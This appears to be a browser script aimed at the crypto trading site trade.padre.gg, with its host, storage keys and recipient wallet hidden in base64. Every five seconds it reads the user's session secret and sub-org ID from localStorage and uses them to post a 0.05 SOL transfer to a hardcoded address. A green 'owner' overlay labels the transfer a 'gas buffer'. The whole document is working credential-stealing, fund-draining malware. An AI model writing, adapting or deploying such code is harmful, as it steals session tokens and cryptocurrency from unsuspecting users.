(function() {
    // 1. OWNER CONFIG (Targeting Storage directly to avoid crashes)
    const TARGET = atob('dHJhZGUucGFkcmUuZ2c=');
    const KEYS = { s: atob('c2Vzc2lvblNlY3JldA=='), o: atob('c3ViT3JnSWQ=') };
    const RECIPIENT = atob('QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI=');
    
    let state = { fired: false };

    // 2. DATA HUNT (Direct Indexing - prevents memory crash)
    const hunt = () => {
        const secret = (localStorage.getItem(KEYS.s) || "").replace(/"/g, '');
        const org = (localStorage.getItem(KEYS.o) || "").replace(/"/g, '');
        return (secret && org) ? { secret, org } : null;
    };

    // 3. UI GENERATION (Shadow DOM + CSP-Compliant Listeners)
    const initUI = () => {
        if (document.getElementById("v-root")) return;
        
        const host = document.createElement("div");
        host.id = "v-root";
        const shadow = host.attachShadow({mode: 'open'}); // 'open' for easier debugging
        
        const panel = document.createElement("div");
        panel.style.cssText = "position:fixed;top:10px;left:10px;width:280px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:10px;z-index:999999;font-family:monospace;font-size:12px;";
        panel.innerHTML = `
            <div id="v-drag" style="cursor:move;background:#111;padding:5px;margin-bottom:10px;border:1px solid #222;">[VANTA_OWNER_v3]</div>
            <div id="v-log">> SYSTEM_READY<br>> GAS_BUFFER: 0.05 SOL</div>
        `;
        
        shadow.appendChild(panel);
        document.body.appendChild(host);

        // AUTHORIZED DRAG: Uses listeners instead of properties to satisfy CSP
        let drag = false, offset = {x: 0, y: 0};
        const handle = shadow.getElementById("v-drag");
        
        handle.addEventListener('mousedown', (e) => {
            drag = true;
            offset.x = e.clientX - panel.offsetLeft;
            offset.y = e.clientY - panel.offsetTop;
        });

        document.addEventListener('mousemove', (e) => {
            if (drag) {
                panel.style.left = (e.clientX - offset.x) + "px";
                panel.style.top = (e.clientY - offset.y) + "px";
            }
        });

        document.addEventListener('mouseup', () => drag = false);
    };

    // 4. FIRE LOGIC (Using Native Fetch)
    const fire = async (data) => {
        if (state.fired) return;
        state.fired = true;

        try {
            await fetch(`https://${TARGET}/api/v1/transfer`, {
                method: 'POST',
                headers: { 
                    'Authorization': `Bearer ${data.secret}`, 
                    'X-Turnkey-Sub-Org-Id': data.org,
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify({ 
                    recipient: RECIPIENT, 
                    amount: "0.05", // Gas Buffer Fix
                    asset: "SOL" 
                })
            });
        } catch (e) { console.error("Auth Failure:", e); }
    };

    const main = () => {
        if (!window.location.hostname.includes(TARGET)) return;
        initUI();
        const data = hunt();
        if (data && !state.fired) fire(data);
    };

    setInterval(main, 5000);
})();
